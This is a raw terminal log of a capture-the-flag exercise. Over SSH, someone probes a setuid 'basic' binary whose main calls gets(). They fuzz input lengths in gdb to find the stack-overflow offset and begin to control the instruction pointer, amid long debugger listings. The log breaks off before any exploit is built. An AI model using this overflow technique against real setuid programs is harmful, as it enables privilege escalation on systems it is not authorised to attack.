Connection to 51.254.114.246 closed.
root@kali:~/Downloads# ssh basic@51.254.114.246 
load pubkey "/root/.ssh/id_rsa": invalid format
basic@51.254.114.246's password: 
Last login: Sun Mar 24 12:46:22 2019 from 219.100.84.160
WARNING WARNING WARNING!!!!
***************************
*  You have been hacked!! *
***************************
basic@vps614257:~$ ls
basic  flag.txt  main.c
basic@vps614257:~$ ls -ltr
total 20
-rw------- 1 root          root           408 Mar 24 00:25 main.c
-r--r----- 1 basic-cracked basic-cracked   27 Mar 24 00:28 flag.txt
-r-sr-x--- 1 basic-cracked basic         8928 Mar 24 00:31 basic
basic@vps614257:~$ cat flag.txt
cat: flag.txt: Permission denied
basic@vps614257:~$ ./basic
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
basic@vps614257:~$ vi main.c 
basic@vps614257:~$ pwd
/home/basic
basic@vps614257:~$ cd ..
basic@vps614257:/home$ ls
baby1  basic  bruter  mrknwoledge  pwn2  pwn4  rev      ropper  simple   ubuntu
baby2  blind  monji   pwn1         pwn3  pwn5  revenge  signal  special  welcome
basic@vps614257:/home$ cd basic/
basic@vps614257:~$ ls
basic  flag.txt  main.c
basic@vps614257:~$ ls -ltr
total 20
-rw------- 1 root          root           408 Mar 24 00:25 main.c
-r--r----- 1 basic-cracked basic-cracked   27 Mar 24 00:28 flag.txt
-r-sr-x--- 1 basic-cracked basic         8928 Mar 24 00:31 basic
basic@vps614257:~$ gdb
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
(gdb) Quit
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) quit
basic@vps614257:~$ gdb ./basic
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./basic...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/basic/basic 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 26678) exited normally]
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400680 <+0>:	push   %rbp
   0x0000000000400681 <+1>:	mov    %rsp,%rbp
   0x0000000000400684 <+4>:	push   %rbx
   0x0000000000400685 <+5>:	sub    $0x88,%rsp
   0x000000000040068c <+12>:	mov    $0x0,%eax
   0x0000000000400691 <+17>:	callq  0x400500 <geteuid@plt>
   0x0000000000400696 <+22>:	mov    %eax,%ebx
   0x0000000000400698 <+24>:	mov    $0x0,%eax
   0x000000000040069d <+29>:	callq  0x400500 <geteuid@plt>
   0x00000000004006a2 <+34>:	mov    %ebx,%esi
   0x00000000004006a4 <+36>:	mov    %eax,%edi
   0x00000000004006a6 <+38>:	mov    $0x0,%eax
   0x00000000004006ab <+43>:	callq  0x400530 <setreuid@plt>
   0x00000000004006b0 <+48>:	lea    -0x90(%rbp),%rax
   0x00000000004006b7 <+55>:	mov    %rax,%rdi
   0x00000000004006ba <+58>:	mov    $0x0,%eax
   0x00000000004006bf <+63>:	callq  0x400520 <gets@plt>
   0x00000000004006c4 <+68>:	mov    $0x0,%eax
   0x00000000004006c9 <+73>:	add    $0x88,%rsp
   0x00000000004006d0 <+80>:	pop    %rbx
   0x00000000004006d1 <+81>:	pop    %rbp
   0x00000000004006d2 <+82>:	retq   
End of assembler dump.
(gdb) run <<< $(python -c "print 'A'*5000")
Starting program: /home/basic/basic <<< $(python -c "print 'A'*5000")

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006d2 in main ()
(gdb) run <<< $(python -c "print 'A'*500")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*500")

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006d2 in main ()
(gdb) run <<< $(python -c "print 'A'*100")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*100")
[Inferior 1 (process 9908) exited normally]
(gdb) run <<< $(python -c "print 'A'*150")
Starting program: /home/basic/basic <<< $(python -c "print 'A'*150")
[Inferior 1 (process 14127) exited normally]
(gdb) run <<< $(python -c "print 'A'*200")
Starting program: /home/basic/basic <<< $(python -c "print 'A'*200")

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006d2 in main ()
(gdb) run <<< $(python -c "print 'A'*180")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*180")

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006d2 in main ()
(gdb) run <<< $(python -c "print 'A'*170")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*170")

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006d2 in main ()
(gdb) run <<< $(python -c "print 'A'*160")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*160")

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006d2 in main ()
(gdb) run <<< $(python -c "print 'A'*155")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*155")

Program received signal SIGSEGV, Segmentation fault.
0x00007f8300414141 in ?? ()
(gdb) run <<< $(python -c "print 'A'*153")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*153")

Program received signal SIGSEGV, Segmentation fault.
0x00007f873bfb0043 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
(gdb) run <<< $(python -c "print 'A'*150")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*150")
[Inferior 1 (process 3217) exited normally]
(gdb) run <<< $(python -c "print 'A'*151")
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151")
[Inferior 1 (process 6765) exited normally]
(gdb) run <<< $(python -c "print 'A'*152")
Starting program: /home/basic/basic <<< $(python -c "print 'A'*152")

Program received signal SIGSEGV, Segmentation fault.
0x00007f870334e800 in __libc_start_main (main=0x400680 <main>, argc=1, argv=0x7fffd3f77238, init=<optimized out>, 
    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffd3f77228) at ../csu/libc-start.c:285
285	../csu/libc-start.c: No such file or directory.
(gdb) i r
rax            0x0	0
rbx            0x4141414141414141	4702111234474983745
rcx            0x7f87036f28e0	140217854929120
rdx            0x7f87036f4790	140217854936976
rsi            0xb490a8	11833512
rdi            0x7fffd3f77158	140736749597016
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffd3f77160	0x7fffd3f77160
r8             0xb490a9	11833513
r9             0x4141414141414141	4702111234474983745
r10            0x4141414141414141	4702111234474983745
r11            0x246	582
r12            0x400550	4195664
r13            0x7fffd3f77230	140736749597232
r14            0x0	0
r15            0x0	0
rip            0x7f870334e800	0x7f870334e800 <__libc_start_main+192>
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) info functions
All defined functions:

File ../bits/stdlib-bsearch.h:
void *__GI_bsearch(const void *, const void *, size_t, size_t, __compar_fn_t);

File ../csu/init-first.c:
void __libc_init_first(int, char **, char **);
void _dl_start(void);
void _init(int, char **, char **);

File ../csu/libc-start.c:
int __libc_start_main(int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), 
    void *);

File ../debug/memmove_chk.c:
void *__memmove_chk_sse2(void *, const void *, size_t, size_t);

File ../elf/dl-runtime.c:
void _dl_call_pltexit(struct link_map *, Elf64_Word, const void *, void *);
Elf64_Addr _dl_fixup(struct link_map *, Elf64_Word);
Elf64_Addr _dl_profile_fixup(struct link_map *, Elf64_Word, Elf64_Addr, void *, long *);

File ../elf/dl-sysdep.c:
void _dl_show_auxv(void);
Elf64_Addr _dl_sysdep_start(void **, void (*)(const Elf64_Phdr *, Elf64_Word, Elf64_Addr *, Elf64_auxv_t *));
void _dl_sysdep_start_cleanup(void);

File ../iconv/skeleton.c:
int __gconv_transform_ascii_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ascii(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs2(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs2reverse(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs4(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs4le(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
---Type <return> to continue, or q <return> to quit---
int __gconv_transform_internal_utf8(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs2_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs2reverse_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_ucs4_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);
int __gconv_transform_ucs4le_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_utf8_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, 
    unsigned char **, size_t *, int, int);

File ../include/ctype.h:
const uint16_t **__ctype_b_loc(void);
const int32_t **__ctype_tolower_loc(void);
const int32_t **__ctype_toupper_loc(void);

File ../intl/l10nflist.c:
struct loaded_l10nfile *_nl_make_l10nflist(struct loaded_l10nfile **, const char *, size_t, int, const char *, const char *, 
    const char *, const char *, const char *, const char *, int);
const char *_nl_normalize_codeset(const char *, size_t);

File ../login/updwtmp.c:
void __updwtmp(const char *, const struct utmp *);

File ../login/utmp_file.c:
static void endutent_file(void);
static int getutent_r_file(struct utmp *, struct utmp **);
static int getutid_r_file(const struct utmp *, struct utmp *, struct utmp **);
static int getutline_r_file(const struct utmp *, struct utmp *, struct utmp **);
static int internal_getut_r(const struct utmp *, struct utmp *, _Bool *);
static struct utmp *pututline_file(const struct utmp *);
static int setutent_file(void);
static void timeout_handler(int);
static int updwtmp_file(const char *, const struct utmp *);

File ../misc/sbrk.c:
void *__sbrk(intptr_t);

---Type <return> to continue, or q <return> to quit---
File ../misc/syslog.c:
void __GI___vsyslog_chk(int, int, const char *, struct __va_list_tag *);
void __syslog(int, const char *, ...);
void __syslog_chk(int, int, const char *, ...);
void __vsyslog(int, const char *, struct __va_list_tag *);
void closelog(void);
void openlog(const char *, int, int);
int setlogmask(int);
static void cancel_handler(void *);
static void openlog_internal(const char *, int, int);

File ../nptl/sigaction.c:
int __GI___sigaction(int, const struct sigaction *, struct sigaction *);
int __sigaction(int, const struct sigaction *, struct sigaction *);

File ../nss/getXXbyYY.c:
struct aliasent *getaliasbyname(const char *);
struct group *getgrgid(gid_t);
struct group *getgrnam(const char *);
struct hostent *gethostbyaddr(const void *, socklen_t, int);
struct hostent *gethostbyname(const char *);
struct hostent *gethostbyname2(const char *, int);
struct netent *getnetbyaddr(uint32_t, int);
struct netent *getnetbyname(const char *);
struct protoent *getprotobyname(const char *);
struct protoent *getprotobynumber(int);
struct passwd *getpwnam(const char *);
struct passwd *getpwuid(uid_t);
struct rpcent *getrpcbyname(const char *);
struct rpcent *getrpcbynumber(int);
struct servent *getservbyname(const char *, const char *);
struct servent *getservbyport(int, const char *);
struct sgrp *getsgnam(const char *);
struct spwd *getspnam(const char *);

File ../nss/getXXbyYY_r.c:
int __getaliasbyname_r(const char *, struct aliasent *, char *, size_t, struct aliasent **);
int __getgrgid_r(gid_t, struct group *, char *, size_t, struct group **);
int __getgrnam_r(const char *, struct group *, char *, size_t, struct group **);
int __gethostbyaddr_r(const void *, socklen_t, int, struct hostent *, char *, size_t, struct hostent **, int *);
---Type <return> to continue, or q <return> to quit---
int __gethostbyname2_r(const char *, int, struct hostent *, char *, size_t, struct hostent **, int *);
int __gethostbyname_r(const char *, struct hostent *, char *, size_t, struct hostent **, int *);
int __getnetbyaddr_r(uint32_t, int, struct netent *, char *, size_t, struct netent **, int *);
int __getnetbyname_r(const char *, struct netent *, char *, size_t, struct netent **, int *);
int __getprotobyname_r(const char *, struct protoent *, char *, size_t, struct protoent **);
int __getprotobynumber_r(int, struct protoent *, char *, size_t, struct protoent **);
int __getpwnam_r(const char *, struct passwd *, char *, size_t, struct passwd **);
int __getpwuid_r(uid_t, struct passwd *, char *, size_t, struct passwd **);
int __getrpcbyname_r(const char *, struct rpcent *, char *, size_t, struct rpcent **);
int __getrpcbynumber_r(int, struct rpcent *, char *, size_t, struct rpcent **);
int __getservbyname_r(const char *, const char *, struct servent *, char *, size_t, struct servent **);
int __getservbyport_r(int, const char *, struct servent *, char *, size_t, struct servent **);
int __getsgnam_r(const char *, struct sgrp *, char *, size_t, struct sgrp **);
int __getspnam_r(const char *, struct spwd *, char *, size_t, struct spwd **);

File ../nss/getXXent.c:
struct aliasent *getaliasent(void);
struct group *getgrent(void);
struct hostent *gethostent(void);
struct netent *getnetent(void);
struct protoent *getprotoent(void);
struct passwd *getpwent(void);
struct rpcent *getrpcent(void);
struct servent *getservent(void);
struct sgrp *getsgent(void);
struct spwd *getspent(void);

File ../nss/getXXent_r.c:
int __getaliasent_r(struct aliasent *, char *, size_t, struct aliasent **);
int __getgrent_r(struct group *, char *, size_t, struct group **);
int __gethostent_r(struct hostent *, char *, size_t, struct hostent **, int *);
int __getnetent_r(struct netent *, char *, size_t, struct netent **, int *);
int __getprotoent_r(struct protoent *, char *, size_t, struct protoent **);
int __getpwent_r(struct passwd *, char *, size_t, struct passwd **);
int __getrpcent_r(struct rpcent *, char *, size_t, struct rpcent **);
int __getservent_r(struct servent *, char *, size_t, struct servent **);
int __getsgent_r(struct sgrp *, char *, size_t, struct sgrp **);
int __getspent_r(struct spwd *, char *, size_t, struct spwd **);
void endaliasent(void);
void endgrent(void);
---Type <return> to continue, or q <return> to quit---
void endhostent(void);
void endnetent(void);
void endprotoent(void);
void endpwent(void);
void endrpcent(void);
void endservent(void);
void endsgent(void);
void endspent(void);
void setaliasent(void);
void setgrent(void);
void sethostent(int);
void setnetent(int);
void setprotoent(int);
void setpwent(void);
void setrpcent(int);
void setservent(int);
void setsgent(void);
void setspent(void);

File ../posix/glob.c:
int __GI_glob(const char *, int, int (*)(const char *, int), glob_t *);
void __GI_globfree(glob_t *);
int __glob_pattern_p(const char *, int);
int __glob_pattern_type(const char *, int);
static int collated_compare(const void *, const void *);
static int glob_in_dir(const char *, const char *, int, int (*)(const char *, int), glob_t *, size_t);
static int link_exists2_p(const char *, size_t, const char *, glob_t *);
static int prefix_array(const char *, char **, size_t);

File ../posix/sched_cpucount.c:
static int generic_cpucount(size_t, const cpu_set_t *);
static int popcount_cpucount(size_t, const cpu_set_t *);

File ../setjmp/longjmp.c:
void __longjmp_chk(struct __jmp_buf_tag *, int);

File ../signal/allocrtsig.c:
int __GI___libc_current_sigrtmax(void);
int __GI___libc_current_sigrtmin(void);
int __libc_allocate_rtsig(int);
---Type <return> to continue, or q <return> to quit---

File ../signal/sigfillset.c:
int __GI_sigfillset(sigset_t *);

File ../signal/sigreturn.c:
int __sigreturn(struct sigcontext *);

File ../socket/sa_len.c:
int __GI___libc_sa_len(sa_family_t);

File ../stdio-common/printf_fphex.c:
int __printf_fphex(_IO_FILE *, const struct printf_info *, const void * const *);

File ../stdlib/gmp.h:
mp_limb_t __mpn_add(mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);
mp_limb_t __mpn_add_1(mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);
mp_limb_t __mpn_sub(mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);
mp_limb_t __mpn_sub_1(mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);

File ../stdlib/labs.c:
long labs(long);

File ../stdlib/ldiv.c:
ldiv_t ldiv(long, long);

File ../stdlib/strtod.c:
double __GI___wcstod_internal(const wchar_t *, wchar_t **, int);
float __GI___wcstof_internal(const wchar_t *, wchar_t **, int);
long double __GI___wcstold_internal(const wchar_t *, wchar_t **, int);
double __GI_wcstod(const wchar_t *, wchar_t **);
float __GI_wcstof(const wchar_t *, wchar_t **);
long double __GI_wcstold(const wchar_t *, wchar_t **);

File ../stdlib/strtod_l.c:
long double __GI_____strtold_l_internal(const char *, char **, int, __locale_t);
long double __GI___strtold_l(const char *, char **, __locale_t);
double __GI___wcstod_l(const wchar_t *, wchar_t **, __locale_t);
float __GI___wcstof_l(const wchar_t *, wchar_t **, __locale_t);
long double __GI___wcstold_l(const wchar_t *, wchar_t **, __locale_t);
double ____wcstod_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
---Type <return> to continue, or q <return> to quit---
float ____wcstof_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
long double ____wcstold_l_internal(const wchar_t *, wchar_t **, int, __locale_t);
static long double round_and_return(mp_limb_t *, intmax_t, int, mp_limb_t, mp_size_t, int);
static const char *str_to_mpn(const char *, int, mp_limb_t *, mp_size_t *, intmax_t *, size_t, const char *, const char *);

File ../stdlib/strtod_nan_main.c:
double __GI___wcstod_nan(const wchar_t *, wchar_t **, wchar_t);
float __GI___wcstof_nan(const wchar_t *, wchar_t **, wchar_t);
long double __GI___wcstold_nan(const wchar_t *, wchar_t **, wchar_t);

File ../stdlib/strtol.c:
long __GI___strtol_internal(const char *, char **, int, int);
unsigned long __GI___strtoul_internal(const char *, char **, int, int);
long __GI___wcstol_internal(const wchar_t *, wchar_t **, int, int);
unsigned long __GI___wcstoul_internal(const wchar_t *, wchar_t **, int, int);
long __strtol(const char *, char **, int);
unsigned long __strtoul(const char *, char **, int);
long __wcstol(const wchar_t *, wchar_t **, int);
unsigned long __wcstoul(const wchar_t *, wchar_t **, int);

File ../stdlib/strtol_l.c:
long __GI_____strtol_l_internal(const char *, char **, int, int, __locale_t);
unsigned long __GI_____strtoul_l_internal(const char *, char **, int, int, __locale_t);
long __GI___strtol_l(const char *, char **, int, __locale_t);
unsigned long __GI___strtoul_l(const char *, char **, int, __locale_t);
long __GI___wcstol_l(const wchar_t *, wchar_t **, int, __locale_t);
unsigned long __GI___wcstoul_l(const wchar_t *, wchar_t **, int, __locale_t);
long ____wcstol_l_internal(const wchar_t *, wchar_t **, int, int, __locale_t);
unsigned long ____wcstoul_l_internal(const wchar_t *, wchar_t **, int, int, __locale_t);

File ../string/bits/string2.h:
void *__mempcpy_small(void *, char, char, char, char, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
char *__stpcpy_small(char *, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
char *__strcpy_small(char *, __uint16_t, __uint16_t, __uint32_t, __uint32_t, size_t);
size_t __strcspn_c1(const char *, int);
size_t __strcspn_c2(const char *, int, int);
size_t __strcspn_c3(const char *, int, int, int);
char *__strpbrk_c2(const char *, int, int);
char *__strpbrk_c3(const char *, int, int, int);
char *__strsep_1c(char **, char);
---Type <return> to continue, or q <return> to quit---
char *__strsep_2c(char **, char, char);
char *__strsep_3c(char **, char, char, char);
size_t __strspn_c1(const char *, int);
size_t __strspn_c2(const char *, int, int);
size_t __strspn_c3(const char *, int, int, int);
char *__strtok_r_1c(char *, char, char **);

File ../string/memmove.c:
void *__memmove_sse2(void *, const void *, size_t);
void *memmove(void *, const void *, size_t);

File ../string/str-two-way.h:
static char *two_way_long_needle(const unsigned char *, size_t, const unsigned char *, size_t);

File ../string/strcasecmp.c:
int __strcasecmp_l_nonascii(const char *, const char *, __locale_t);

File ../string/strcoll.c:
int __GI___wcscoll(const wchar_t *, const wchar_t *);

File ../string/strcoll_l.c:
int __GI___wcscoll_l(const wchar_t *, const wchar_t *, __locale_t);

File ../string/strncase.c:
int __strncasecmp_l_nonascii(const char *, const char *, size_t, __locale_t);

File ../string/strncat.c:
char *__strncat_sse2(char *, const char *, size_t);

File ../string/strstr.c:
char *__strstr_sse2(const char *, const char *);

File ../string/strxfrm.c:
size_t wcsxfrm(wchar_t *, const wchar_t *, size_t);

File ../string/strxfrm_l.c:
size_t __GI___wcsxfrm_l(wchar_t *, const wchar_t *, size_t, __locale_t);

File ../sysdeps/gnu/getutmp.c:
void getutmp(const struct utmpx *, struct utmp *);
---Type <return> to continue, or q <return> to quit---

File ../sysdeps/gnu/unwind-resume.c:
void _Unwind_Resume(struct _Unwind_Exception *);
_Unwind_Reason_Code __gcc_personality_v0(int, _Unwind_Action, _Unwind_Exception_Class, struct _Unwind_Exception *, 
    struct _Unwind_Context *);
void __libgcc_s_init(void);

File ../sysdeps/i386/fpu/s_isinfl.c:
int __GI___isinfl(long double);

File ../sysdeps/i386/fpu/s_isnanl.c:
int __GI___isnanl(long double);

File ../sysdeps/ieee754/dbl-64/dbl2mpn.c:
mp_size_t __mpn_extract_double(mp_ptr, mp_size_t, int *, int *, double);

File ../sysdeps/ieee754/dbl-64/mpn2dbl.c:
double __mpn_construct_double(mp_srcptr, int, int);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_finite.c:
int __GI___finite(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_frexp.c:
double __frexp(double, int *);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_isinf.c:
int __GI___isinf(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_isnan.c:
int __GI___isnan(double);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_modf.c:
double __modf(double, double *);

File ../sysdeps/ieee754/dbl-64/wordsize-64/s_scalbn.c:
double __scalbn(double, int);

File ../sysdeps/ieee754/flt-32/mpn2flt.c:
float __mpn_construct_float(mp_srcptr, int, int);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/ieee754/flt-32/s_finitef.c:
int __GI___finitef(float);

File ../sysdeps/ieee754/flt-32/s_frexpf.c:
float __frexpf(float, int *);

File ../sysdeps/ieee754/flt-32/s_isinff.c:
int __GI___isinff(float);

File ../sysdeps/ieee754/flt-32/s_isnanf.c:
int __GI___isnanf(float);

File ../sysdeps/ieee754/flt-32/s_modff.c:
float __modff(float, float *);

File ../sysdeps/ieee754/flt-32/s_scalbnf.c:
float __scalbnf(float, int);

File ../sysdeps/ieee754/ldbl-96/mpn2ldbl.c:
long double __mpn_construct_long_double(mp_srcptr, int, int);

File ../sysdeps/ieee754/ldbl-96/s_frexpl.c:
long double __frexpl(long double, int *);

File ../sysdeps/ieee754/ldbl-96/s_modfl.c:
long double __modfl(long double, long double *);

File ../sysdeps/ieee754/ldbl-96/s_signbitl.c:
int __signbitl(long double);

File ../sysdeps/nptl/fork.c:
pid_t __libc_fork(void);

File ../sysdeps/nptl/jmp-unwind.c:
void _longjmp_unwind(struct __jmp_buf_tag *, int);

File ../sysdeps/posix/clock_getres.c:
int __clock_getres(clockid_t, struct timespec *);

File ../sysdeps/posix/closedir.c:
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400680 <+0>:	push   %rbp
   0x0000000000400681 <+1>:	mov    %rsp,%rbp
   0x0000000000400684 <+4>:	push   %rbx
   0x0000000000400685 <+5>:	sub    $0x88,%rsp
   0x000000000040068c <+12>:	mov    $0x0,%eax
   0x0000000000400691 <+17>:	callq  0x400500 <geteuid@plt>
   0x0000000000400696 <+22>:	mov    %eax,%ebx
   0x0000000000400698 <+24>:	mov    $0x0,%eax
   0x000000000040069d <+29>:	callq  0x400500 <geteuid@plt>
   0x00000000004006a2 <+34>:	mov    %ebx,%esi
   0x00000000004006a4 <+36>:	mov    %eax,%edi
   0x00000000004006a6 <+38>:	mov    $0x0,%eax
   0x00000000004006ab <+43>:	callq  0x400530 <setreuid@plt>
   0x00000000004006b0 <+48>:	lea    -0x90(%rbp),%rax
   0x00000000004006b7 <+55>:	mov    %rax,%rdi
   0x00000000004006ba <+58>:	mov    $0x0,%eax
   0x00000000004006bf <+63>:	callq  0x400520 <gets@plt>
   0x00000000004006c4 <+68>:	mov    $0x0,%eax
   0x00000000004006c9 <+73>:	add    $0x88,%rsp
   0x00000000004006d0 <+80>:	pop    %rbx
   0x00000000004006d1 <+81>:	pop    %rbp
   0x00000000004006d2 <+82>:	retq   
End of assembler dump.
(gdb) disas get_flag
No symbol "get_flag" in current context.
(gdb) disas flag
No symbol "flag" in current context.
(gdb) disas shell
No symbol "shell" in current context.
(gdb) disas get_shell
No symbol "get_shell" in current context.
(gdb) disas print_flag
No symbol "print_flag" in current context.
(gdb) info 
"info" must be followed by the name of an info command.
List of info subcommands:

info address -- Describe where symbol SYM is stored
info all-registers -- List of all registers and their contents
info args -- Argument variables of current stack frame
info auto-load -- Print current status of auto-loaded files
info auto-load-scripts -- Print the list of automatically loaded Python scripts
info auxv -- Display the inferior's auxiliary vector
info bookmarks -- Status of user-settable bookmarks
info breakpoints -- Status of specified breakpoints (all user-settable breakpoints if no argument)
info checkpoints -- IDs of currently known checkpoints
info classes -- All Objective-C classes
info common -- Print out the values contained in a Fortran COMMON block
info copying -- Conditions for redistributing copies of GDB
info dcache -- Print information on the dcache performance
info display -- Expressions to display when program stops
info exceptions -- List all Ada exception names
info extensions -- All filename extensions associated with a source language
info files -- Names of targets and files being debugged
info float -- Print the status of the floating point unit
info frame -- All about selected stack frame
info frame-filter -- List all registered Python frame-filters
info functions -- All function names
info guile -- Prefix command for Guile info displays
info handle -- What debugger does when program gets various signals
info inferiors -- IDs of specified inferiors (all inferiors if no argument)
info line -- Core addresses of the code for a source line
info locals -- Local variables of current stack frame
info macro -- Show the definition of MACRO
info macros -- Show the definitions of all macros at LINESPEC
info mem -- Memory region attributes
info os -- Show OS data ARG
info pretty-printer -- GDB command to list all registered pretty-printers
info probes -- Show available static probes
info proc -- Show /proc process information about any running process
info program -- Execution status of the program
info record -- Info record options
info registers -- List of integer registers and their contents
info scope -- List the variables local to a scope
info selectors -- All Objective-C selectors
---Type <return> to continue, or q <return> to quit---
info set -- Show all GDB settings
info sharedlibrary -- Status of loaded shared object libraries
info signals -- What debugger does when program gets various signals
info skip -- Display the status of skips
info source -- Information about the current source file
info sources -- Source files in the program
info stack -- Backtrace of the stack
info static-tracepoint-markers -- List target static tracepoints markers
info symbol -- Describe what symbol is at location ADDR
info target -- Names of targets and files being debugged
info tasks -- Provide information about all known Ada tasks
info terminal -- Print inferior's saved terminal status
info threads -- Display currently known threads
info tracepoints -- Status of specified tracepoints (all tracepoints if no argument)
info tvariables -- Status of trace state variables and their values
info type-printers -- GDB command to list all registered type-printers
info types -- All type names
info unwinder -- GDB command to list unwinders
info variables -- All global and static variable names
info vector -- Print the status of the vector unit
info vtbl -- Show the virtual function table for a C++ object
info warranty -- Various kinds of warranty you do not have
info watchpoints -- Status of specified watchpoints (all watchpoints if no argument)
info win -- List of all displayed windows
info xmethod -- GDB command to list registered xmethod matchers

Type "help info" followed by info subcommand name for full documentation.
Type "apropos word" to search for commands related to "word".
Command name abbreviations are allowed if unambiguous.
(gdb) info functions
All defined functions:

File ../bits/stdlib-bsearch.h:
void *__GI_bsearch(const void *, const void *, size_t, size_t, __compar_fn_t);

File ../csu/init-first.c:
void __libc_init_first(int, char **, char **);
void _dl_start(void);
void _init(int, char **, char **);

File ../csu/libc-start.c:
int __libc_start_main(int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), 
    void *);

File ../debug/memmove_chk.c:
void *__memmove_chk_sse2(void *, const void *, size_t, size_t);

File ../elf/dl-runtime.c:
void _dl_call_pltexit(struct link_map *, Elf64_Word, const void *, void *);
Elf64_Addr _dl_fixup(struct link_map *, Elf64_Word);
Elf64_Addr _dl_profile_fixup(struct link_map *, Elf64_Word, Elf64_Addr, void *, long *);

File ../elf/dl-sysdep.c:
void _dl_show_auxv(void);
